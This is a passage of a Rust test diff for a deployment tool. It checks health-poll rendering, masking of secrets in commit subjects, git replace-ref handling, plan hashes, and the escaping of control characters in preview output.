+                        url_label: "https://app.example.com/health".to_owned(),
+                        attempts,
+                        interval_ms,
+                        timeout_ms,
+                    },
+                }],
+                ..plan()
+            },
+            ..report(DeployOutcome::DryRun, vec![])
+        });
+        let from = rendered.find("      GET ").unwrap();
+        rendered[from..rendered.find("\n\n  (dry-run").unwrap()].to_owned()
+    };
+    let literal = "https://app.example.com/health";
+    // a literal domain: one line says it all
+    assert_eq!(
+        lines(literal, 15, 2000, 5000),
+        "      GET https://app.example.com/health — healthy on 2xx; up to 15 attempts, 2s \
+         apart, 5s each (1m 43s at most)"
+    );
+    assert_eq!(
+        lines(literal, 1, 2000, 5000),
+        "      GET https://app.example.com/health — healthy on 2xx; 1 attempt, 5s at most"
+    );
+    assert_eq!(
+        lines(literal, 15, 1500, 5000),
+        "      GET https://app.example.com/health — healthy on 2xx; up to 15 attempts, 1.5s \
+         apart, 5s each (1m 36s at most)"
+    );
+    assert_eq!(
+        lines(literal, 2, 2500, 45_000),
+        "      GET https://app.example.com/health — healthy on 2xx; up to 2 attempts, 2.5s \
+         apart, 45s each (1m 32.5s at most)"
+    );
+    // a referenced domain: the declared form on a line of its own
+    assert_eq!(
+        lines(
+            &format!("https://{}/health", marker("DEPLOY_DOMAIN")),
+            15,
+            2000,
+            5000
+        ),
+        format!(
+            "      GET https://app.example.com/health — healthy on 2xx; up to 15 attempts, 2s \
+             apart, 5s each (1m 43s at most)\n      declared as https://{}/health",
+            shown("DEPLOY_DOMAIN")
+        )
+    );
+    for (ms, shown) in [
+        (0, "0s"),
+        (1, "0.001s"),
+        (250, "0.25s"),
+        (1500, "1.5s"),
+        (2000, "2s"),
+        (60_000, "1m"),
+        (92_500, "1m 32.5s"),
+        (103_000, "1m 43s"),
+        (3_605_000, "1h 5s"),
+        (3_600_250, "1h 0.25s"),
+    ] {
+        assert_eq!(format_millis(ms), shown, "{ms}");
+    }
+}
+
+/// The subject a plan holds is the commit's, read by the version's hash, masked, and cut
+/// at its bound — what a preview shows and the hash covers, and no secret of it.
+#[tokio::test]
+async fn the_subject_is_masked_then_bounded() {
+    use super::checkout::{SUBJECT_CHARS, git_shipped};
+
+    let mut registry = crate::secret::SecretRegistry::new();
+    registry.register("ZAP_T_SUBJECT_SECRET", "hunter2hunter2");
+    let masker = registry.freeze().unwrap();
+    let shipped = |subject: &str| {
+        let local = Connection::Mock(
+            MockConnection::new("local")
+                .with("git rev-parse --short=12 HEAD", ok("abc1234\n"))
+                .with(SUBJECT_READ, ok(subject)),
+        );
+        let masker = &masker;
+        async move { git_shipped(&local, false, masker).await.unwrap() }
+    };
+    let read = shipped("Ship hunter2hunter2 now\n").await;
+    assert_eq!(read.version, "abc1234");
+    assert_eq!(read.subject, "Ship [MASKED:ZAP_T_SUBJECT_SECRET] now");
+    let long = "x".repeat(SUBJECT_CHARS + 1);
+    assert_eq!(
+        shipped(&format!("{long}\n")).await.subject,
+        format!("{}…", "x".repeat(SUBJECT_CHARS))
+    );
+    let at_bound = "x".repeat(SUBJECT_CHARS);
+    assert_eq!(shipped(&at_bound).await.subject, at_bound);
+    assert_eq!(shipped("").await.subject, "");
+
+    // A subject git couldn't read is an error, never an empty subject.
+    let local = Connection::Mock(
+        MockConnection::new("local")
+            .with("git rev-parse --short=12 HEAD", ok("abc1234\n"))
+            .with(
+                SUBJECT_READ,
+                CommandOutput {
+                    success: false,
+                    code: 128,
+                    stdout: String::new(),
+                    stderr: "fatal: bad object abc1234\n".to_owned(),
+                },
+            ),
+    );
+    let Err(crate::error::Error::Git(message)) = git_shipped(&local, false, &masker).await else {
+        panic!("expected a git error");
+    };
+    assert_eq!(
+        message,
+        format!(
+            "could not read the commit's subject (`{SUBJECT_READ}`): fatal: bad object abc1234"
+        )
+    );
+}
+
 /// A refusal that couldn't be recorded offers the hash and nothing else, whichever
 /// way the wetrun tried to bind: a bare re-run would have no preview to bind to.
 #[test]
@@ -3862,10 +4283,10 @@ fn an_unrecorded_refusal_offers_only_the_hash() {
             ..report(outcome.clone(), vec![])
         });
         assert!(
-            rendered.ends_with(
-                "  review the plan above, then re-run with --expect-plan deadbeef\n\
-                 plan_hash: deadbeef\n"
-            ),
+            rendered.ends_with(&format!(
+                "  review the plan above, then re-run with --expect-plan deadbeef\n{}",
+                GOLDEN_RECAP.replace("<host>", "host.example")
+            )),
             "{outcome:?}: {rendered}"
         );
         assert!(!rendered.contains("binds to this preview"), "{outcome:?}");
@@ -4217,16 +4638,22 @@ async fn a_secret_named_host_is_its_token_in_a_plan_with_no_hash() {
         rendered.contains("  - Create tarball (tarball)"),
         "{rendered}"
     );
+    // The footer and the banner close the plan, and the recap the preview.
     assert!(
-        rendered.ends_with(&format!(
-            "  (dry-run — a wetrun of this config is refused, so this plan has no \
+        rendered.contains(&format!(
+            "\n\n  (dry-run — a wetrun of this config is refused, so this plan has no \
              plan_hash and is not recorded as a preview)\n  UNBINDABLE — the target host \
              `{zap_t_host_token}` references `{zap_t_host_token}`, a secret name (call \
              `zap.unmask('ZAP_T_HOST_TOKEN')` if it is not a secret, or declare the value \
              literally); the plan holds a masking token in its place, so it names no one \
-             machine and its hash is the same for every value the reference takes\n",
+             machine and its hash is the same for every value the reference takes\n\n  \
+             in short:\n",
             zap_t_host_token = shown("ZAP_T_HOST_TOKEN")
         )),
+        "{rendered}"
+    );
+    assert!(
+        rendered.contains("\n    host: [MASKED:ZAP_T_HOST_TOKEN]\n"),
         "{rendered}"
     );
     assert!(dry.warnings.is_empty(), "{:?}", dry.warnings);
@@ -4314,6 +4741,15 @@ async fn a_masked_connecting_user_is_unbindable_too() {
     assert!(!rendered.contains("hiddenuser"), "{rendered}");
     assert!(
         rendered.contains("/srv/app/.zap-deploy-[MASKED:ZAP_T_USER_TOKEN]-abc1234.tar.gz"),
+        "{rendered}"
+    );
+    // The user line names it by its token, as the archive does, in the recap too.
+    assert!(
+        rendered.contains("\n  user: [MASKED:ZAP_T_USER_TOKEN]\n"),
+        "{rendered}"
+    );
+    assert!(
+        rendered.contains("\n    user: [MASKED:ZAP_T_USER_TOKEN]\n"),
         "{rendered}"
     );
     assert!(
@@ -4474,13 +4910,21 @@ async fn a_plan_names_the_endpoint_its_health_gate_polls() {
             .await
             .unwrap();
         let rendered = render_deploy(&dry);
-        assert!(
-            rendered.contains(&format!(
-                "      GET https://{zap_t_domain}/health — ",
-                zap_t_domain = shown("ZAP_T_DOMAIN")
-            )),
-            "{rendered}"
-        );
+        // Each poll's first line says what it does; the next, the URL as declared, which
+        // says where its domain comes from.
+        for (path, reads) in [
+            ("/health", "healthy on 2xx"),
+            ("/ready", "ready on 2xx, unserved on 404"),
+        ] {
+            assert!(
+                rendered.contains(&format!(
+                    "      GET https://{domain}{path} — {reads}; up to 15 attempts, 2s apart, \
+                     5s each (1m 43s at most)\n      declared as https://{zap_t_domain}{path}\n",
+                    zap_t_domain = shown("ZAP_T_DOMAIN")
+                )),
+                "{rendered}"
+            );
+        }
         // The plan records what the block's reference resolved to, and says so.
         assert_eq!(
             dry.plan
@@ -4497,14 +4941,7 @@ async fn a_plan_names_the_endpoint_its_health_gate_polls() {
             rendered.contains(&format!("\n  references:\n    ZAP_T_DOMAIN = {domain}\n")),
             "{rendered}"
         );
-        assert!(
-            rendered.contains(&format!("      polls https://{domain}/health\n")),
-            "{rendered}"
-        );
-        assert!(
-            rendered.contains(&format!("      polls https://{domain}/ready\n")),
-            "{rendered}"
-        );
+
         hashes.push(dry.plan_hash);
     }
     assert_ne!(hashes[0], hashes[1]);
@@ -4524,7 +4961,9 @@ async fn skipping_the_preflight_is_a_different_plan() {
         .await
         .unwrap();
     let skipped = Rig::new("def5678").deploy(&skip).await.unwrap();
-    assert!(render_deploy(&checked).contains("  preflight: 1 apply-managed resource(s), digest "));
+    assert!(render_deploy(&checked).contains(
+        "  preflight: checks 1 apply-managed resource for drift before the steps — digest "
+    ));
     assert!(render_deploy(&skipped).contains("  preflight: skipped (--skip-preflight)\n"));
     assert_ne!(checked.plan_hash, skipped.plan_hash);
 
@@ -4792,6 +5231,80 @@ fn the_dirty_tree_blob_read_hashes_symlinks_by_their_targets() {
         );
         assert_eq!(String::from_utf8(blobs).unwrap(), expected, "{label}");
     }
+}
+
+/// A `refs/replace/` entry for the commit the checkout is at changes neither what the
+/// preview says it ships nor what the tree is compared with: the subject read is the
+/// commit's own, and a tree that is that commit's reads clean, one that is the
+/// replacement's reads dirty — though plain `git log` and `git status` read the
+/// replacement in both.
+#[test]
+fn a_replace_ref_moves_neither_the_subject_nor_the_tree_state() {
+    let system_path = std::env::var_os("PATH").unwrap_or_default();
+    if !git_available(&system_path) {
+        return;
+    }
+    let dir = tempfile::tempdir().unwrap();
+    let repo = dir.path().join("repo");
+    std::fs::create_dir(&repo).unwrap();
+    let git = |args: &[&str]| {
+        let output = std::process::Command::new("git")
+            .args([
+                "-c",
+                "user.name=zap",
+                "-c",
+                "user.email=zap@example.invalid",
+            ])
+            .args(args)
+            .current_dir(&repo)
+            .env("GIT_CONFIG_GLOBAL", "/dev/null")
+            .env("GIT_CONFIG_NOSYSTEM", "1")
+            .output()
+            .unwrap();
+        assert!(output.status.success(), "git {args:?}");
+        String::from_utf8(output.stdout).unwrap().trim().to_owned()
+    };
+    git(&["init", "-q"]);
+    std::fs::write(repo.join("f"), "replacement\n").unwrap();
+    git(&["add", "f"]);
+    git(&["commit", "-q", "-m", "The replacement"]);
+    let replacement = git(&["rev-parse", "HEAD"]);
+    std::fs::write(repo.join("f"), "shipped\n").unwrap();
+    git(&["commit", "-q", "-am", "The shipped commit"]);
+    let shipped = git(&["rev-parse", "--short=12", "HEAD"]);
+    git(&["replace", &shipped, &replacement]);
+    let read = |script: &str| {
+        String::from_utf8(run_dirty_tree_script(
+            Path::new("sh"),
+            script,
+            &repo,
+            &system_path,
+        ))
+        .unwrap()
+    };
+    // what the reads are guarding against
+    assert_eq!(
+        read(&format!("git log -1 --format=%s {shipped}")),
+        "The replacement\n"
+    );
+    assert_ne!(read("git status --porcelain"), "");
+
+    assert_eq!(
+        read(&super::checkout::subject_command(&shipped)),
+        "The shipped commit\n"
+    );
+    assert_eq!(
+        read(super::checkout::DIRTY_TREE_STATUS),
+        "",
+        "the commit's tree"
+    );
+    assert_eq!(read(super::checkout::DIRTY_TREE_DIFF), "");
+    std::fs::write(repo.join("f"), "replacement\n").unwrap();
+    assert_eq!(
+        read(super::checkout::DIRTY_TREE_STATUS),
+        " M f\n",
+        "the replacement's tree"
+    );
 }
 
 /// The checkout's own config can't make a tree read clean that holds what `dirty_id`
@@ -5312,7 +5825,8 @@ async fn a_secret_in_a_step_renders_masked() {
             DeployAction::Build { command } | DeployAction::Tarball { command, .. } => {
                 rig.local = rig.local.with(command.clone(), ok(""));
             }
-            DeployAction::ExtractSwap { script } => {
+            DeployAction::ExtractSwap(swap) => {
+                let script = &dry.plan.swap_script(swap);
                 let computed = script.replace("[MASKED:ZAP_T_OPERATOR_SECRET]", "hunter2hunter2");
                 assert_ne!(&computed, script);
                 rig.target = rig.target.with(computed, ok(&format!("{SWAPPED_LINE}\n")));
@@ -5618,6 +6132,7 @@ fn the_names_a_preview_prints_are_escaped() {
     let ctx = DeployContext {
         references: std::collections::BTreeMap::new(),
         version: "abc1234".to_owned(),
+        subject: "Ship the release".to_owned(),
         target_user: "deploy".to_owned(),
         deployed_by: "op@box".to_owned(),
         previous_version: None,
@@ -5629,7 +6144,6 @@ fn the_names_a_preview_prints_are_escaped() {
     };
     let rendered = render_deploy(&DeployReport {
         target: format!("{}\u{1b}[1A.example", marker("DEPLOY_HOST")),
-        previous_version: None,
         plan: plan_deploy(&deploy, &target, &ctx),
         ..report(DeployOutcome::DryRun, vec![])
     });
@@ -5640,8 +6154,10 @@ fn the_names_a_preview_prints_are_escaped() {
     for shown in [
         "deploy — target {env:DEPLOY_HOST}<U+001B>[1A.example (dry-run)\n",
         "  host: h.example<U+001B>[2K.com\n",
+        "    host: h.example<U+001B>[2K.com\n",
         "\"user\":\"dep<U+202E>loy\"",
-        "      polls https://app.example<U+000D>.com/health\n",
+        "      GET https://app.example<U+000D>.com/health — ",
+        "\n      declared as https://{env:DEPLOY_DOMAIN}/health\n",
     ] {
         assert!(rendered.contains(shown), "{shown}: {rendered}");
     }
@@ -5838,14 +6354,14 @@ async fn a_declined_prompt_refuses_records_the_plan_it_showed_and_the_next_deplo
             "{rendered}"
         );
         assert!(
-            rendered.ends_with(
-                &GOLDEN_NO_PREVIEW_TAIL
-                    .replace(
-                        "  REFUSED — nothing ran: this plan was not reviewed.",
-                        "  DECLINED — nothing ran: this plan was not confirmed."
-                    )
-                    .replace("deadbeef", &declined.plan_hash)
-            ),
+            rendered.ends_with(&refused_foot(
+                &GOLDEN_NO_PREVIEW_TAIL.replace(
+                    "  REFUSED — nothing ran: this plan was not reviewed.",
+                    "  DECLINED — nothing ran: this plan was not confirmed."
+                ),
+                HOST,
+                &declined.plan_hash
+            )),
             "{rendered}"
         );
 
@@ -6623,7 +7139,7 @@ async fn a_failure_before_or_at_the_swap_is_told_apart() {
         .steps
         .iter()
         .find_map(|step| match &step.action {
-            DeployAction::ExtractSwap { script } => Some(script.clone()),
+            DeployAction::ExtractSwap(swap) => Some(dry.plan.swap_script(swap)),
             _ => None,
         })
         .unwrap();
@@ -6689,6 +7205,7 @@ fn plan_with_health() -> DeployPlan {
             url_label: "https://app.example.com/health".to_owned(),
             attempts: 15,
             interval_ms: 2000,
+            timeout_ms: PROBE_TIMEOUT_MS,
         },
     });
     plan
@@ -6771,6 +7288,43 @@ fn completed_until_health() -> Vec<StepOutcome> {
         completed("extract_swap", "Deployed"),
         completed("restart", ""),
     ]
+}
+
+/// A first release says so, in the same words, on its version line and on the line that
+/// closes its deploy.
+#[test]
+fn a_first_release_says_so_on_its_version_and_closing_lines() {
+    let first = |outcome| {
+        render_deploy(&DeployReport {
+            plan: DeployPlan {
+                previous: None,
+                ..plan()
+            },
+            ..report(outcome, vec![])
+        })
+    };
+    let deployed = first(deployed());
+    assert!(
+        deployed.starts_with(
+            "deploy — target host.example (wetrun)\n  version: abc1234 (first release)\n"
+        ),
+        "{deployed}"
+    );
+    assert!(
+        deployed.ends_with(
+            "\ndeployed abc1234 to host.example (first release) in 0.0s\nplan_hash: deadbeef\n"
+        ),
+        "{deployed}"
+    );
+    let dry = first(DeployOutcome::DryRun);
+    for line in [
+        "  version: abc1234 (first release)\n",
+        "      replaces: none — nothing may be at `current` yet\n",
+        "      keeps: 5 releases, counting this one\n",
+        "    version: abc1234 (first release)\n",
+    ] {
+        assert!(dry.contains(line), "{line}: {dry}");
+    }
 }
 
 /// A deployed wetrun's report: a table of the preflight and each step, with its time
@@ -7075,6 +7629,7 @@ async fn a_poll_that_passes_is_summarized_by_what_it_found() {
                     url,
                     attempts: 1,
                     interval_ms: 0,
+                    timeout_ms: PROBE_TIMEOUT_MS,
                 }
             } else {
                 DeployAction::Readiness {
@@ -7082,6 +7637,7 @@ async fn a_poll_that_passes_is_summarized_by_what_it_found() {
                     url,
                     attempts: 1,
                     interval_ms: 0,
+                    timeout_ms: PROBE_TIMEOUT_MS,
                 }
             },
         }
@@ -7108,9 +7664,9 @@ async fn a_poll_that_passes_is_summarized_by_what_it_found() {
         &Connection::Mock(
             MockConnection::new("host").with("systemctl restart app", ok("restarted app\n")),
         ),
-        super::AppLive {
+        super::AppWalk {
             app: "/root/app",
-            previous: None,
+            swap_script: &DeployPlan::swap_script,
         },
         &plan,
         ReleaseArchive::under(scratch.path()),
@@ -7272,7 +7828,7 @@ async fn a_failed_swap_over_the_same_version_is_not_known_to_have_swapped() {
         .steps
         .iter()
         .find_map(|step| match &step.action {
-            DeployAction::ExtractSwap { script } => Some(script.clone()),
+            DeployAction::ExtractSwap(swap) => Some(dry.plan.swap_script(swap)),
             _ => None,
         })
         .unwrap();
@@ -7310,9 +7866,7 @@ async fn an_extract_with_no_archive_is_known_not_to_have_swapped() {
         steps: vec![DeployStep {
             id: DeployStepId::ExtractSwap,
             name: "Extract and swap release".to_owned(),
-            action: DeployAction::ExtractSwap {
-                script: "the script".to_owned(),
-            },
+            action: plan().steps[3].action.clone(),
         }],
         ..plan()
     };
@@ -7321,9 +7875,9 @@ async fn an_extract_with_no_archive_is_known_not_to_have_swapped() {
     let walked = execute_deploy_plan(
         &Connection::Mock(MockConnection::new("local")),
         &Connection::Mock(target.clone()),
-        super::AppLive {
+        super::AppWalk {
             app: "/root/app",
-            previous: None,
+            swap_script: &DeployPlan::swap_script,
         },
         &plan,
         ReleaseArchive::under(scratch.path()),
